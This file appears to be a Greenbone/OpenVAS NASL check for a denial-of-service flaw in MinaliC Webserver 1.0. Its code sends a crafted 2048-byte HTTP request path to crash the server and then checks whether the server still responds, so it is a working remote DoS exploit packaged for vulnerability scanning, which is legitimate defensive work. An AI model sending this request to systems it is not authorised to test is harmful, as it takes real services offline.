if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800187" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)" );
	script_bugtraq_id( 44393 );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "MinaliC Webserver Denial of Service Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/41982/" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15334/" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "minaliC/banner" );
	script_tag( name: "impact", value: "Successful exploitation will let the remote unauthenticated
  attackers to cause a denial of service or possibly execute arbitrary code." );
	script_tag( name: "affected", value: "MinaliC Webserver MinaliC 1.0" );
	script_tag( name: "insight", value: "The flaw is caused the way minalic webserver handles request
  with a length greater than or equal to 2048 bytes." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running MinaliC Webserver and is prone to denial
  of service vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: minaliC" )){
	exit( 0 );
}
req = http_get( item: "/", port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!ContainsString( res, "Server: minaliC" )){
	exit( 0 );
}
craftedData = crap( data: "0x00", length: 2048 );
req = http_get( item: craftedData, port: port );
res = http_keepalive_send_recv( port: port, data: req );
req = http_get( item: "/", port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!ContainsString( res, "Server: minaliC" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

